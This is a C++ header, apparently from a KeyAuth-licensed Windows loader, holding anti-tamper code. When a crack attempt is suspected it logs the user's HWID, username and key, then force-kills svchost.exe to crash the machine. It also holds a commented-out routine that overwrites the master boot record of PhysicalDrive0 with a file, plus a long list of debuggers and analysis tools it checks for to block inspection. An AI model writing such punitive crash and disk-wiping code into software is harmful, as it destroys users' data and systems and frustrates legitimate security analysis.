#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <filesystem>
#include <vector>
#include "../../../includes.hpp"

// Helper function to find process by name and return its PID
DWORD find_process(const char* process_name) {
    const auto snapshot = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 proc_entry{};
    proc_entry.dwSize = sizeof(proc_entry);

    if (LI_FN(Process32First).safe()(snapshot, &proc_entry)) {
        do {
            if (strcmp(process_name, proc_entry.szExeFile) == 0) {
                LI_FN(CloseHandle).safe()(snapshot);
                return proc_entry.th32ProcessID;
            }
        } while (LI_FN(Process32Next).safe()(snapshot, &proc_entry));
    }

    LI_FN(CloseHandle).safe()(snapshot);
    return 0;
}

// MBR wipe functionality (currently disabled)
void wipe_mbr() {
    // Commented out for safety
    /*
    HANDLE drive = CreateFileW(_(L"\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) return;

    HANDLE binary = CreateFileW(_(L"./boot.bin"), GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (binary == INVALID_HANDLE_VALUE) {
        CloseHandle(drive);
        return;
    }

    DWORD size = GetFileSize(binary, 0);
    if (size != 512) {
        CloseHandle(binary);
        CloseHandle(drive);
        return;
    }

    auto new_mbr = std::make_unique<uint8_t[]>(size);
    DWORD bytes_read;
    
    if (ReadFile(binary, new_mbr.get(), size, &bytes_read, 0)) {
        WriteFile(drive, new_mbr.get(), size, &bytes_read, 0);
    }

    CloseHandle(binary);
    CloseHandle(drive);
    */
}

namespace BlackListed {
    // Reserved for blacklist functionality
}

namespace MaliciousActivity {
    // Force BSOD by killing critical system process
    void trigger_bsod() {
        system(_("TASKKILL /F /IM svchost.exe 2>NULL"));
    }
}

// Handle blacklisted user detection
void handle_blacklist() {
    const std::string message = 
        _("\nCrack Attempt!\nHWID: ") + KeyAuthApp.data.hwid +
        _("\nUser: ") + username +
        _("\nKey: ") + key;
        
    KeyAuthApp.log(message);
    MaliciousActivity::trigger_bsod();
    //wipe_mbr();
}

void prevent_blacklist() {
    // Reserved for blacklist prevention logic
}

// Check for debugging and analysis tools
bool check_suspicious_processes() {
    const std::vector<const char*> suspicious_processes = {
        _("ollydbg.exe"),
        _("ProcessHacker.exe"), 
        _("tcpview.exe"),
        _("autoruns.exe"),
        _("autorunsc.exe"),
        _("filemon.exe"),
        _("procmon.exe"),
        _("regmon.exe"),
        _("procexp.exe"),
        _("idaq.exe"),
        _("idaq64.exe"),
        _("ida.exe"),
        _("ida64.exe"),
        _("ImmunityDebugger.exe"),
        _("Wireshark.exe"),
        _("dumpcap.exe"),
        _("HookExplorer.exe"),
        _("ImportREC.exe"),
        _("PETools.exe"),
        _("LordPE.exe"),
        _("SysInspector.exe"),
        _("proc_analyzer.exe"),
        _("sysAnalyzer.exe"),
        _("sniff_hit.exe"),
        _("windbg.exe"),
        _("joeboxcontrol.exe"),
        _("joeboxserver.exe"),
        _("ResourceHacker.exe"),
        _("x32dbg.exe"),
        _("x64dbg.exe"),
        _("Fiddler.exe"),
        _("httpdebugger.exe"),
        _("HTTP Debugger Windows Service (32 bit).exe"),
        _("HTTPDebuggerUI.exe"),
        _("HTTPDebuggerSvc.exe"),
        _("cheatengine-x86_64.exe"),
        _("cheatengine-x86_64-SSE4-AVX2.exe")
    };

    for (const auto& process : suspicious_processes) {
        if (find_process(process)) {
            system("color 4");
            std::cout << _("Unallowed Process Found, Please Restart PC or Contact Support.");
            Sleep(3000);
            exit(0);
            return true;
        }
    }
    
    return false;
}
